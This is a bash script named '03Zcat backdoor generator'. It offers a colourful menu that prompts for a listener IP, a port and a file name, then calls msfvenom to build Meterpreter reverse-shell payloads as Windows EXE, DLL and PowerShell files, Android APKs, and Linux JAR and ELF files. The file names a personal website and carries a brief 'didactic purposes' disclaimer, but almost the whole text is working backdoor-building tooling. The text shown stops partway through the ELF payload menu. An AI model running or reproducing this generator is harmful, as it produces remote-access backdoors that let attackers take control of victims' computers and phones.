#!/bin/bash
Black='\033[1;30m'        # Black
Red='\033[1;31m'          # Red
Green='\033[1;32m'        # Green
Yellow='\033[1;33m'       # Yellow
Blue='\033[1;34m'         # Blue
Purple='\033[1;35m'       # Purple
Cyan='\033[1;36m'         # Cyan
White='\033[1;37m'        # White
NC='\033[0m'
blue='\033[0;34m'
white='\033[0;37m'
lred='\033[0;31m'

root=$( id -u )
folder='~/Desktop/payloads'



logo () {
    echo -e "\033[1;32m────────────────────────────▄▀▄─────▄▀▄
───────────────────────────▄█░░▀▀▀▀▀░░█▄
───────────────────────▄▄──█░░░░░░░░░░░█──▄▄
──────────────────────█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█ ☣️03Zcat
                                     backdoor generator
                                     By: GZaballa (Killerpop) https://www.greyhelmet.ml/  
                                     

                                     
      \033[1;31mThis tool is created for didactic purposes and not to commit a crime. 
      Haxk.Ur does not take care of any malicious use of the tool. 
      We recommend the use in a controlled laboratory.       By Staff GreyHelmet SEC  
      
      ";

}

target () {
    echo -ne "\n${Blue}[☣️03Zcat] LHOST>> ${White}"; read ip
    echo -ne "${Blue}[☣️03Zcat] LPORT>> ${White}"; read port
    echo -ne "${Blue}[☣️03Zcat] FILE NAME>> ${White}"; read file
}


windows () {
    clear
    logo 
sleep 0.3
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
echo -e "\t${Green}              ☣️☣️    EXECUTE WINDOWS OS ☣️☣️            "
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Blue}☣ "
echo -e "${White}          1⃣ ${Purple}EXE         ${Blue}                                   ☣"
echo -e "☣ ${White}          2⃣ ${Purple}DLL      ${Blue}                                      ☣"
echo -e "☣ ${White}          3⃣ ${Purple}Powershell       ${Blue}                              ☣"
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Green}[☣️03Zcat]>>${White} " 
read execute


case  $execute  in

    1)
    windowsexe;;

    2)
    Windowsdll ;;

    3)
    Windowsps1 ;;

    * )
    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
    sleep 1
    echo -e "${Cyan}[☣️03Zcat] Exiting..."
    sleep 0.2 
    exit ;;
    
    esac
}

windowsexe () {
    clear
    logo 
    echo -e "\n"
    sleep 0.3
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "\t${Green}     ☣️☣️  .EXE Payloads for Windows   ☣️☣️                             "
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}windows/meterpreter/reverse_http         ${Blue}         ☣"
    echo -e "☣ ${White}3⃣ ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      ☣"
    echo -e "☣ ${White}4⃣ ${Purple}windows/meterpreter/reverse_https         ${Blue}        ☣"
    echo -e "☣ ${White}5⃣ ${Purple}windows/meterpreter/reverse_tcp_uuid        ${Blue}      ☣"
    echo -e "☣ ${White}6⃣ ${Purple}windows/meterpreter/reverse_winhttp          ${Blue}     ☣"
    echo -e "☣ ${White}7⃣ ${Purple}windows/meterpreter/reverse_winhttps        ${Blue}      ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadWindow

    case  $payloadWindow  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_http' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_dns' ;;

        4)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_https' ;;
    
        5)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_uuid' ;;

        6)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_winhttp' ;;
    
        7)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_winhttps' ;;
    
        *)
        echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
       	sleep 1 
      	exit ;;

    esac
}

Windowsdll () {
    clear
    logo 
    echo -e "\n"
    sleep 0.3
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "\t${Green}     ☣️☣️  .DLL Payloads for Windows   ☣️☣️                             "
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}windows/meterpreter/reverse_http         ${Blue}         ☣"
    echo -e "☣ ${White}3⃣ ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      ☣"
    echo -e "☣ ${White}4⃣ ${Purple}windows/meterpreter/reverse_https         ${Blue}        ☣"
    echo -e "☣ ${White}5⃣ ${Purple}windows/meterpreter/reverse_tcp_uuid        ${Blue}      ☣"
    echo -e "☣ ${White}6⃣ ${Purple}windows/meterpreter/reverse_winhttp          ${Blue}     ☣"
    echo -e "☣ ${White}7⃣ ${Purple}windows/meterpreter/reverse_winhttps        ${Blue}      ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadWindow

    case  $payloadWindow  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_http' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_dns' ;;

        4)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_https' ;;
    
        5)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_uuid' ;;

        6)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_winhttp' ;;
    
        7)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f dll > ~/Desktop/payloads/$file.dll 2>/dev/null
        payload='windows/meterpreter/reverse_winhttps' ;;
    
        *)
        echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
       	sleep 1 
      	exit ;;

    esac
}

Windowsps1 () {
    clear
    logo 
    echo -e "\n"
    sleep 0.3
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "\t${Green}     ☣️☣️   Powershell Payloads for Windows   ☣️☣️                             "
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}windows/meterpreter/reverse_http         ${Blue}         ☣"
    echo -e "☣ ${White}3⃣ ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      ☣"
    echo -e "☣ ${White}4⃣ ${Purple}windows/meterpreter/reverse_https         ${Blue}        ☣"
    echo -e "☣ ${White}5⃣ ${Purple}windows/meterpreter/reverse_tcp_uuid        ${Blue}      ☣"
    echo -e "☣ ${White}6⃣ ${Purple}windows/meterpreter/reverse_winhttp          ${Blue}     ☣"
    echo -e "☣ ${White}7⃣ ${Purple}windows/meterpreter/reverse_winhttps        ${Blue}      ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadWindow

    case  $payloadWindow  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_http' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_dns' ;;

        4)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_https' ;;
    
        5)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_uuid' ;;

        6)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_winhttp' ;;
    
        7)
        target
        echo 
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f ps1 > ~/Desktop/payloads/$file.ps1 2>/dev/null
        payload='windows/meterpreter/reverse_winhttps' ;;
    
        *)
        echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!" 
       	sleep 1 
      	exit ;;

    esac
}

android () {
    clear
    logo
    echo -e "\n"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "\t${Green}            ☣️☣️  Payloads for Android  ☣️☣️            "
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}android/meterpreter/reverse_tcp           ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}android/meterpreter/reverse_https         ${Blue}        ☣"
    echo -e "☣ ${White}3⃣ ${Purple}android/meterpreter/reverse_http         ${Blue}         ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadAndro

    case  $payloadAndro  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_https' ;;
	
	3)
	target
	echo 
	  echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_http' ;;

	* )
        echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
       	sleep 1 
      	exit ;;

    esac
}

linux () {
    clear
    logo 
sleep 0.3
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
echo -e "\t${Green}              ☣️☣️    EXECUTE Linux OS ☣️☣️            "
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Blue}☣ "
echo -e "${White}          1⃣ ${Purple}JAVA         ${Blue}                                  ☣"
echo -e "☣ ${White}          2⃣ ${Purple}ELF      ${Blue}                                      ☣"
echo -e "☣ ${White}          3⃣ ${Purple}PYTHON       ${Blue}                                  ☣"
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Green}[☣️03Zcat]>>${White} " 
read execute


case  $execute  in

    1)
    Linuxjava;;

    2)
    Linuxelf ;;

    3)
    Linuxpy ;;

    * )
    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
    sleep 1
    echo -e "${Cyan}[☣️03Zcat] Exiting..."
    sleep 0.2 
    exit ;;
    
    esac
}

Linuxjava (){
    clear
    logo
    echo -e "\n"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "+\t${Green}             ☣️☣️  .JAR Payloads for Linux  ☣️☣️              +"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        ☣"
    echo -e "☣ ${White}3⃣ ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         ☣"
    echo -e "☣ ${White}4⃣ ${Purple}linux/x86/meterpreter/reverse_tcp_uuid   ${Blue}         ☣"
    echo -e "☣ ${White}5⃣ ${Purple}linux/x86/meterpreter/reverse_ipv6_tcp   ${Blue}         ☣"
    echo -e "☣ ${White}6⃣ ${Purple}linux/x86/meterpreter/reverse_nonx_tcp   ${Blue}         ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadlinux
  
    case  $payloadlinux  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter_reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter_reverse_https' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter_reverse_http' ;;

        4)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
        
        5)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
        
        6)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f jar > ~/Desktop/payloads/$file.jar 2>/dev/null
        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;

    
        * )
	echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
        sleep 1
        exit ;;

    esac
}

Linuxelf (){
    clear
    logo
    echo -e "\n"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "+\t${Green}             ☣️☣️  .ELF Payloads for Linux  ☣️☣️              +"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        ☣"
